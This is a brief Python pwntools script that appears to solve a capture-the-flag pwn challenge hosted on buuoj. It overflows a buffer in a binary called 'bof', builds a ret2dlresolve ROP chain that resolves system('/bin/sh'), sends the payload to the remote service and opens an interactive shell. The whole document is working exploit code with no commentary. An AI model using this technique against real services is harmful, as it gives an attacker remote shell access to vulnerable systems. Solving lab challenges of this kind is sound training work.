from pwn import *

elf = ELF('./bof')
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

r = remote('node3.buuoj.cn', 29698)

r.recvline()
r.send(fit({0x70: rop.chain(), 0x100: dlresolve.payload}))
r.interactive()
